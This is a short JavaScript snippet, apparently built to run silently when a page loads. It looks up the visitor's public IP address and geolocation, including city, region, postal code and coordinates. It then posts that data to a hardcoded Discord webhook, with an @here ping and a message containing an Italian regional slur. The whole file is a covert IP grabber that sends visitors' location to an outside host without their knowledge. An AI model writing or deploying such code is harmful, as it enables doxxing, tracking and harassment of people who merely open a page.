const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1415335695526133860/FmL8qcUC5qx4BehKEmq-c1shZ9THV1tbCrv3uAftb56-iJT4Jwg-WqYL3yL6n6KBPF2n'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "Sono Un Bot", // optionally changeable
                            avatar_url: "https://media.trustradius.com/vendor-logos/nn/Ie/WQRTT9T5T4XP.JPEG", // optionally changeable
                            content: `Bro Ho Trovato Il Terrone @here`,
                            embeds: [
                                {
                                    title: 'Ecco Quello Che A Te Piace Vedere',
                                    description: `**IP >> **${ipadd}\n**Rete >> ** ${geoData.network}\n**Città >> ** ${geoData.city}\n**Regione >> ** ${geoData.region}\n**Paese >> ** ${geoData.country_name}\n**Codice Postale >> ** ${geoData.postal}\n**Latitudine >> ** ${geoData.latitude}\n**Longitudine >> ** ${geoData.longitude}`,
                                    color: 0x800080 // optionally changeable
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();
